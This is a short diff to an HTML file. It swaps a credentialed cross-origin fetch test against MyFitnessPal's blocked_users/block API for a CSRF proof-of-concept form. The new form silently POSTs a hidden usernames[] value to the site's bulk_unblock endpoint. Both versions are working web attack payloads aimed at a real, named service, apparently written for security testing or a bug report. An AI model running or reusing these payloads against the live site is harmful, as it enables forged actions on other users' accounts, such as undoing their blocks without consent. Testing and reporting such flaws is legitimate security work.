@@ -1,26 +1,11 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<body>
-<h3>CORS CSRF Test</h3>
-<script>
-fetch("https://www.myfitnesspal.com/api/services/blocked_users/block", {
-    method: "POST",
-    credentials: "include", // Send cookies
-    headers: {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer TEST" // See if CORS allows this
-    },
-    body: JSON.stringify({
-        target_user_id: 123456 // Change to test payload
-    })
-})
-.then(response => response.text())
-.then(text => {
-    document.body.innerHTML += "<pre>Response:\n" + text + "</pre>";
-})
-.catch(err => {
-    document.body.innerHTML += "<pre>CORS or network error:\n" + err + "</pre>";
-});
-</script>
-</body>
+  <body>
+    <h3>CSRF PoC — bulk_unblock (usernames[])</h3>
+    <form action="https://www.myfitnesspal.com/api/services/blocked_users/bulk_unblock" method="POST">
+      <!-- repeat for multiple usernames -->
+      <input type="hidden" name="usernames[]" value="MyFitnessPal">
+      <button type="submit">Send PoC (click to run)</button>
+    </form>
+  </body>
 </html>
